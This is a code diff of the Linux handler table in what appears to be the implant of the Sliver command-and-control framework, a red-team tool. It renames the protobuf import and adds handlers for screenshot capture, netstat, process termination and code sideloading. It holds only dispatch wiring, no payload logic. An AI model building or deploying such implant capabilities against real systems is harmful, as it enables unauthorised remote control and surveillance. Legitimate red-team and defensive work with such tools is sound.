@@ -18,29 +18,42 @@ package handlers
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
-import ( // {{if .Debug}}
-	// {{else}}{{end}}
-	pb "github.com/bishopfox/sliver/protobuf/sliver"
+import (
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
 )
 
 var (
 	linuxHandlers = map[uint32]RPCHandler{
-		pb.MsgPsReq:       psHandler,
-		pb.MsgPing:        pingHandler,
-		pb.MsgLsReq:       dirListHandler,
-		pb.MsgDownloadReq: downloadHandler,
-		pb.MsgUploadReq:   uploadHandler,
-		pb.MsgCdReq:       cdHandler,
-		pb.MsgPwdReq:      pwdHandler,
-		pb.MsgRmReq:       rmHandler,
-		pb.MsgMkdirReq:    mkdirHandler,
-		pb.MsgTask:        taskHandler,
-		pb.MsgRemoteTask:  remoteTaskHandler,
-		pb.MsgIfconfigReq: ifconfigHandler,
-		pb.MsgExecuteReq:  executeHandler,
+		sliverpb.MsgPsReq:        psHandler,
+		sliverpb.MsgTerminateReq: terminateHandler,
+		sliverpb.MsgPing:         pingHandler,
+		sliverpb.MsgLsReq:        dirListHandler,
+		sliverpb.MsgDownloadReq:  downloadHandler,
+		sliverpb.MsgUploadReq:    uploadHandler,
+		sliverpb.MsgCdReq:        cdHandler,
+		sliverpb.MsgPwdReq:       pwdHandler,
+		sliverpb.MsgRmReq:        rmHandler,
+		sliverpb.MsgMkdirReq:     mkdirHandler,
+		sliverpb.MsgTaskReq:      taskHandler,
+		sliverpb.MsgIfconfigReq:  ifconfigHandler,
+		sliverpb.MsgExecuteReq:   executeHandler,
+
+		sliverpb.MsgScreenshotReq: screenshotHandler,
+
+		sliverpb.MsgNetstatReq:  netstatHandler,
+		sliverpb.MsgSideloadReq: sideloadHandler,
+	}
+
+	linuxPivotHandlers = map[uint32]PivotHandler{
 	}
 )
 
+// GetSystemHandlers - Returns a map of the linux system handlers
 func GetSystemHandlers() map[uint32]RPCHandler {
 	return linuxHandlers
+}
+
+// GetSystemPivotHandlers - Returns a map of the linux system handlers
+func GetSystemPivotHandlers() map[uint32]PivotHandler {
+	return linuxPivotHandlers
 }
